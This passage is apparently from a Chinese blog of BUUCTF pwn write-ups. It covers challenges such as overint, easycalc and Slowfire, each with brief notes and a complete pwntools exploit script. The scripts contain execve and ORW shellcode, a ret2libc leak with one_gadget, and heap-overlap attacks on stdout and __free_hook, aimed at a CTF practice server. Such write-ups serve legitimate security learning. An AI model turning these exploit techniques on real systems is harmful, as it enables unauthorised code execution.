sleep(<span class="number">0.1</span>)</span><br><span class="line">   r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">   sleep(<span class="number">0.1</span>)</span><br><span class="line">   r.sendline(size)</span><br><span class="line">   sleep(<span class="number">0.1</span>)</span><br><span class="line">   r.sendline(content)</span><br><span class="line"></span><br><span class="line">p1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">mov rsi, 0x0068732f6e69622f</span></span><br><span class="line"><span class="string">jmp $+0x16</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">p2 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">jmp $+0x1c</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">p3 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov al, 0x3b</span></span><br><span class="line"><span class="string">jmp $+0x1b</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p4 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b'13'</span>.ljust(<span class="number">0xa</span>, <span class="string">b'\x00'</span>) + p32(<span class="number">0xFFFFFFF8</span>), p1)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b'13'</span>, p2)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b'13'</span>, p3)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b'13'</span>, p4)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="鹏城杯-2018-overint"><a href="#鹏城杯-2018-overint" class="headerlink" title="鹏城杯_2018_overint"></a>鹏城杯_2018_overint</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/1.png"></p>
<p>这一题其实不难，需要仔细的看一下</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/2.png"></p>
<p>有两个check，先要过check1， 也就是最后的值要为35，写个脚本来爆破一下就可以了</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/3.png"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">                    v3 = <span class="number">0</span></span><br><span class="line">                    v3 = ((i &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (i &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    v3 = ((j &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (j &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    v3 = ((k &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (k &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    v3 = ((l &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (l &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">if</span> v3 == <span class="number">35</span>:</span><br><span class="line">                        li(<span class="string">'[+] %d, %d, %d, %d'</span> % (i, j, k, l))</span><br></pre></td></tr></tbody></table></figure>

<p>check2的话需要让他为543372146，直接上543372146, 0, 0, 0就可以了</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/4.png"></p>
<p>任意地址写，所以很好利用，首先使用ret2libc泄露出libc。拿到libc之后再次ret2onegadget去运行one_gadget即可getshell。需要注意的地方就是写入地址的时候用循环来执行的话加个p8就可以了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27286</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check1</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">                    v3 = <span class="number">0</span></span><br><span class="line">                    v3 = ((i &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (i &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    v3 = ((j &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (j &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    v3 = ((k &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (k &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    v3 = ((l &gt;&gt; <span class="number">4</span>) + <span class="number">4</span> * v3) ^ (l &lt;&lt; <span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">if</span> v3 == <span class="number">35</span>:</span><br><span class="line">                        li(<span class="string">'[+] %d, %d, %d, %d'</span> % (i, j, k, l))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'Please set arrary number:'</span>, <span class="built_in">chr</span>(<span class="number">4</span>) + <span class="built_in">chr</span>(<span class="number">27</span>) + <span class="built_in">chr</span>(<span class="number">51</span>) + <span class="built_in">chr</span>(<span class="number">124</span>))</span><br><span class="line"><span class="comment">#r.sendafter('Please set arrary number:', bytes([4, 27, 51, 124]))</span></span><br><span class="line">r.sendafter(<span class="string">'How many numbers do you have?\n'</span>, p32(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">543372146</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x40087F</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400b13</span></span><br><span class="line"></span><br><span class="line">p1 = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment">#p1 = flat([pop_rdi_ret, puts_got, puts_plt, main_addr])</span></span><br><span class="line">r.sendafter(<span class="string">'How many positions you want to modify?\n'</span>, p32(<span class="built_in">len</span>(p1)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    r.sendafter(<span class="string">'Which position you want to modify?\n'</span>, p32(<span class="number">0x38</span> + i))</span><br><span class="line">    r.sendafter(<span class="string">'What content you want to write in?\n'</span>, p8(p1[i]))</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'[+] puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">0</span>] + libc_base</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'Please set arrary number:'</span>, <span class="built_in">chr</span>(<span class="number">4</span>) + <span class="built_in">chr</span>(<span class="number">27</span>) + <span class="built_in">chr</span>(<span class="number">51</span>) + <span class="built_in">chr</span>(<span class="number">124</span>))</span><br><span class="line">r.sendafter(<span class="string">'How many numbers do you have?\n'</span>, p32(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">543372146</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line">r.sendafter(<span class="string">' is: \n'</span>, p32(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p2 = p64(one_gadget) + p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">r.sendafter(<span class="string">'How many positions you want to modify?\n'</span>, p32(<span class="built_in">len</span>(p2)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p2)):</span><br><span class="line">    r.sendafter(<span class="string">'Which position you want to modify?\n'</span>, p32(<span class="number">0x38</span> + i))</span><br><span class="line">    r.sendafter(<span class="string">'What content you want to write in?\n'</span>, p8(p2[i]))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="鹏城杯-2018-easycalc"><a href="#鹏城杯-2018-easycalc" class="headerlink" title="鹏城杯_2018_easycalc"></a>鹏城杯_2018_easycalc</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_easycalc/2.png"></p>
<p>这个题目并不难，就是add里fd不好改这里有点恶心。。。</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_easycalc/1.png"></p>
<p>没有show函数那就打stdout，2.27下的off-by-null，堆块重叠，打出unsortedbin，改fd为stdout申请过去。</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_easycalc/3.png"></p>
<p>申请过去之后改flags位和write_base改完主可以输出libc了。接着就是再次利用堆重叠改fd，注意这里有点坑，因为fd这一块是calc功能，直接改fd不好改，所以笔者这里拉低了地址然后直接改size形成了一个堆重叠再改fd的（可能有点麻烦</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28313</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'input&gt;\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, calc, msg</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">b'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"input index\n"</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b"input size\n"</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b"please input number a and b\n"</span>, <span class="string">f'- <span class="subst">{calc}</span>'</span>.encode())</span><br><span class="line">    r.sendafter(<span class="string">b"input string\n"</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, b</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input index'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'please input number a and b'</span>, <span class="string">b'-'</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'input index'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>, <span class="number">0</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="number">0</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4f8</span>, <span class="number">0</span>, <span class="string">'ccccc'</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x28</span>, <span class="number">0</span>, <span class="string">'dddd'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x18</span> + p64(<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="number">0</span>, p1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>, <span class="number">0</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x18</span>, <span class="number">0</span>, <span class="string">'bbb'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">edit(<span class="number">4</span>, libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] - <span class="number">0x3ec0d0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x28</span>, <span class="number">0</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x28</span>, -<span class="number">0x1000</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x58</span>))</span><br><span class="line"></span><br><span class="line">_IO_file_jumps = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'[+] _IO_file_jumps = '</span> + <span class="built_in">hex</span>(_IO_file_jumps))</span><br><span class="line"></span><br><span class="line">libc_base = _IO_file_jumps - libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'[+] free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x40</span>, <span class="number">0</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>, <span class="number">0</span>, <span class="string">b'a'</span> * <span class="number">0x400</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x18</span>, -<span class="number">0x10</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>, <span class="number">0</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x18</span>, <span class="number">0</span>, p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>, <span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(free_hook - <span class="number">8</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x40</span>, <span class="number">0</span>, <span class="string">'aaa'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x40</span>, <span class="number">0</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="BSidesCF-2019Slowfire"><a href="#BSidesCF-2019Slowfire" class="headerlink" title="BSidesCF_2019Slowfire"></a>BSidesCF_2019Slowfire</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/BSidesCF_2019Slowfire/1.png"></p>
<p>看保护估计就是写shellcode了。</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/BSidesCF_2019Slowfire/2.png"></p>
<p>一开始真的是没找到什么漏洞，然后跟进了write_string和read_line_safe之后发现read_line_safe出了问题</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/BSidesCF_2019Slowfire/3.png"></p>
<p>第一次读的时候是buf_size - 1，填满之后total是buf_size - 1，所以可以第二次do while，既然可以第二次do while的话是不是就可以溢出了。ret2shellcode即可(orw)，将shellcode放到name中，然后将ret给覆盖成name即可。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27571</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open read write</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov edi, 0x4040c0</span></span><br><span class="line"><span class="string">mov esi, 0</span></span><br><span class="line"><span class="string">mov eax, 2  </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov esi, 0x404180</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">mov eax, 0x401080</span></span><br><span class="line"><span class="string">call rax</span></span><br><span class="line"><span class="string">mov  edi, DWORD PTR [rsp-0x444]</span></span><br><span class="line"><span class="string">mov  esi, 0x404180</span></span><br><span class="line"><span class="string">mov  edx, 0x100</span></span><br><span class="line"><span class="string">mov  eax, 0x401040</span></span><br><span class="line"><span class="string">call rax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">li(<span class="built_in">str</span>(asm(shellcode)))</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'flag'</span> + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p1 = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Enter message&gt; '</span>, <span class="string">b'a'</span> * (<span class="number">0x430</span> + <span class="number">8</span>) + p64(<span class="number">0x4040c5</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="suctf-2018-easy-overflow-file-structure"><a href="#suctf-2018-easy-overflow-file-structure" class="headerlink" title="suctf_2018_easy_overflow_file_structure"></a>suctf_2018_easy_overflow_file_structure</h2><p>查看保护</p>
